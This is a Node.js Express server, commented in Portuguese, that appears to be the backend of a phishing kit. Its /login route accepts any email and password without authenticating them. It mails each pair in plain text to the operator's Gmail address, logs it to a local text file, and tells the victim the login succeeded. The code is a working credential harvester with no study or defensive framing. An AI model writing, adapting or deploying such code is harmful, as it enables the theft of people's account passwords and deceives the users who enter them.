const express = require('express');
const fs = require('fs');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
const port = 3000;

app.use(express.json());
app.use(cors());

// Configuração do transporte de e-mail
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'seuemail@gmail.com', // Altere para seu e-mail
        pass: 'suasenha'  // Altere para sua senha
    }
});

// Função para enviar e-mail com os dados de login
const sendLoginEmail = (email, password) => {
    const mailOptions = {
        from: 'seuemail@gmail.com',
        to: 'seuemail@gmail.com',
        subject: 'Novo Login Realizado',
        text: `E-mail: ${email}\nSenha: ${password}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log('Erro ao enviar e-mail:', error);
        } else {
            console.log('E-mail enviado:', info.response);
        }
    });
};

// Função para salvar os dados em um arquivo
const saveLoginData = (email, password) => {
    const data = `E-mail: ${email}\nSenha: ${password}\n\n`;
    fs.appendFile('login-data.txt', data, (err) => {
        if (err) {
            console.log('Erro ao salvar:', err);
        } else {
            console.log('Dados de login salvos com sucesso!');
        }
    });
};

// Rota para login
app.post('/login', (req, res) => {
    const { email, password } = req.body;

    if (email && password) {
        sendLoginEmail(email, password);
        saveLoginData(email, password);
        res.json({ message: 'Login bem-sucedido! Verifique seu e-mail.' });
    } else {
        res.status(400).json({ message: 'Dados inválidos' });
    }
});

app.listen(port, () => {
    console.log(`Servidor rodando na porta ${port}`);
});
